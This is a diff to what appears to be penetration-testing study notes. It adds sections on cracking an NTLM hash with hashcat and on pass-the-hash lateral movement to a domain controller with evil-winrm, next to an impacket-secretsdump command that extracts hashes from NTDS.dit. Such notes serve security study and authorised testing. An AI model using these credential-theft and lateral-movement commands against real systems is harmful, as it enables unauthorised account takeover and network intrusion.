@@ -2571,6 +2571,30 @@ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 
 </details>
 
+<details>
+<summary><h3>Cracking hashes and gaining credentials</h3></summary>
+
+In many of the techniques we've covered, we've successfully cracked the hashes we've obtained.
+
+```bash
+sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+```
+
+But what happens if we're unable to crack a hash?
+
+</details>
+
+<details>
+<summary><h3>Pass the Hash (PtH)</h3></summary>
+
+We can attempt to use this attack when needing to move laterally across a network after the initial compromise of a target.
+
+```bash
+evil-winrm -i <DC IP> -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
+```
+
+</details>
+
 </details>
 
 <details>
